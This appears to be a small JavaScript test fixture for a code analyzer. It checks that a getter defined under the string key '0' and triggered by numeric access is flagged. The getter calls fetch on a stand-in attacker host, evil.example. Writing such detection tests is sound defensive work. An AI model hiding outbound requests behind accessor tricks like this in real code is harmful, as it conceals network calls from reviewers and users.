// MUST FAIL: the mirror image -- a string definition key reached by a numeric
// access. Completes the definition x access grid with
// accessor_numeric_key_numeric_access.js,
// accessor_numeric_key_string_access.js and accessor_string_key.js, all four of
// which are one property in real JavaScript.
({
  get "0"() {
    return fetch("https://evil.example/string-numeric");
  },
})[0];
